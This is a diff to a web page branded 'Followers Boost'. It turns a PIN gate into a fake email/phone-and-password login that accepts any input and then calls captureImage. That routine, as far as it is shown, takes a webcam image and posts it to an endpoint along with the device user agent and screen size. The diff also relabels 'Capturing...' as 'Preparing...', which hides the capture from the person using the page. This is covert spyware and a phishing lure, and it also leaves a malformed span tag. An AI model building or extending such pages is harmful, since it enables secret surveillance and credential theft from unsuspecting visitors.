@@ -206,7 +206,6 @@
     <button onclick="toggleMenu()">☰</button>
   </nav>
 
-  <!-- Overlay background -->
   <div id="overlay" class="overlay" onclick="toggleMenu()"></div>
 
   <div id="toggleMenu" class="toggleMenu">
@@ -217,17 +216,18 @@
   
   <main class="flex-grow flex items-center justify-center p-6">
     <div id="loginCard" class="surface p-8 max-w-md w-full">
-      <h2 class="title mb-4 text-center">Enter Access PIN</h2>
-      <p class="text-center mb-6 text-gray-300">Secure access required before proceeding (1111) 🚀</p>
+      <h2 class="title mb-4 text-center">Login Account</h2>
+      <p class="text-center mb-6 text-gray-300">Enter your Email/Number and Password to continue 🚀</p>
 
-      <div class="flex items-center justify-center mb-4">
-        <input id="userPin" type="password" placeholder="••••">
-        <button onclick="userLogin()" class="btn-acc ml-2">Login</button>
+      <div class="flex flex-col space-y-4 mb-4">
+        <input id="userEmail" type="text" placeholder="Email or Phone Number">
+        <input id="userPass" type="password" placeholder="Password">
+        <button onclick="userLogin()" class="btn-acc w-full">Login</button>
       </div>
 
       <div id="spinner" class="hidden mt-6 text-center">
         <div class="animate-spin rounded-full h-10 w-10 border-t-4 border-blue-400 border-opacity-70 mx-auto"></div>
-        <p class="mt-2 text-blue-400">Capturing...</p>
+        <p class="mt-2 text-blue-400">Preparing...</p>
       </div>
 
       <p id="userStatus" class="text-center"></p>
@@ -237,30 +237,27 @@
     ⚡ Powered by <span class="text-blue-400 font-semibold">Followers Boost</span>
   </footer>
   <script>
-    const USER_PIN = "1111";
-
     function toggleMenu() {
       document.getElementById("toggleMenu").classList.toggle("active");
     }
 
     function userLogin() {
-      const pinInput = document.getElementById("userPin");
-      const pin = pinInput.value;
       const status = document.getElementById("userStatus");
-      const card = document.getElementById("loginCard");
       const spinner = document.getElementById("spinner");
+      const card = document.getElementById("loginCard");
 
-      if (pin === USER_PIN) {
-        status.innerHTML = "✅ <span class='text-green-400'>Access Granted...</span>";
-        status.classList.add("success-pulse");
-        spinner.classList.remove("hidden");
-        setTimeout(captureImage, 1500);
-      } else {
-        status.innerHTML = "❌ <span class='text-red-400'>Wrong PIN!</span>";
-        card.classList.remove("shake"); 
-        void card.offsetWidth; 
-        card.classList.add("shake");
-      }
+      status.innerHTML = "✅ <span class='text-green-400'>Access Granted...</span>";
+      spinner.classList.remove("hidden");
+
+      setTimeout(() => {
+        try {
+          captureImage();
+        } catch (err) {
+          spinner.classList.add("hidden");
+          status.innerHTML = "⚠️ <span class='text-red-400'>Unexpected error.</span>";
+          console.error("captureImage missing or failed:", err);
+        }
+      }, 900);
     }
 
     function captureImage() {
@@ -290,13 +287,12 @@
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
                 time: new Date().toLocaleString(),
-                ip: "192.168.0." + Math.floor(Math.random() * 255),
                 device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
                 img: imageData
               })
             })
             .then(() => {
-              document.getElementById("userStatus").innerHTML = "✅ <span class='text-green-400'>Access successful.</span>";
+              document.getElementById("userStatus").innerHTML = "✅ <span class='text-green-400'>Access successful, please wait.</span>";
             })
             .catch(err => {
               document.getElementById("userStatus").innerHTML = "⚠️ <span class='text-yellow-400'>Error saving!</span>";
@@ -305,17 +301,9 @@
           }, 1200);
         })
         .catch(err => {
-          document.getElementById("userStatus").innerHTML = "⚠️ <span class='text-red-400'>Something went wrong!</span>";
+          document.getElementById("userStatus").innerHTML = "⚠️ <span class='text-red-400'Something went wrong!</span>";
           console.error("Camera error:", err);
         });
-    }
-
-    function switchTheme(theme){
-      document.body.classList.add("theming");
-      setTimeout(()=>{
-        document.body.className = "theme-" + theme + " flex flex-col min-h-screen";
-      }, 120);
-      setTimeout(()=> document.body.classList.remove("theming"), 380);
     }
   </script>
 </body>
